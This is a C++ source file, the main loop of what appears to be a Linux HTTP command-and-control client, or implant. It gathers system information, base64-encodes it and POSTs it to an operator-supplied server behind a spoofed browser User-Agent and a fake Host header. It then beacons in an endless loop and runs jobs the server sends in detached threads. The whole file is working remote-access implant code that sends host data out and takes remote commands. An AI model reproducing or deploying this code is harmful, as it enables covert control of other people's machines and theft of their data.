// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 


#include <iostream>
#include <string>
#include "http.h"
#include "utilities.h"
#include "operations.h"
#include <thread>
#include <sharedResourceManager.h>


#define NUM_OF_ARGS 3


int main(int argc, char** argv) {

    if(argc != NUM_OF_ARGS){
        std::cout << "clientHTTP <URL/IP> <PORT>" <<std::endl;
        return -1;
    }

    const std::wstring url{ s2ws(argv[1]) };
    const std::wstring port{ s2ws(argv[2]) };
    if (!isValidPort(ws2s(port))) {
		return -1;
	}

    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?HeartBeatSignal\r\nAccept-Encoding: identity\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nContent-Type: application/octet-stream\r\n";  
    const std::wstring sysInfo {getSysInfo()};
       if(sysInfo.empty()){
        std::cout << "Couldn't extract system information\n";
        //exit(-1);     // Inform CRC about the this status by sending log or json NULL bytes
    }
    SharedResourceManager sharedResources;
    sharedResources.setSysInfoInJson(sysInfo);
 
    std::string dataBase64 = base64_encode((unsigned char*)ws2s(sysInfo).c_str(), sysInfo.length());
    std::wstringstream contentLengthStream;
    contentLengthStream << dataBase64.length();
    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
    request += L"Connection: close\r\n"; 
    request += L"\r\n" + s2ws(dataBase64); 
    
    std::wstring replyFromServerInJson;
    std::wstring response;    
    const std::wstring heartbeatRequestToServer = request;
    
    while(true){
        if(sharedResources.isResponseAvailable()){      // If there is a response to be send to the server
            request = sharedResources.popResponse();
        }
        else {                                          // else, send the standard http post message to the server
            request = heartbeatRequestToServer;
        }        
        replyFromServerInJson = httpPost(url, port, request);        
        if(isJobAvailable(replyFromServerInJson)){  // Check the response from the server to see if it is a job request
            sharedResources.pushJob(replyFromServerInJson);
            std::thread jobThread(startJob, std::ref(sharedResources));      // Spawn a thread if there is a job waiting in the queue
            jobThread.detach();
        }                      
        request = heartbeatRequestToServer;      
    }
}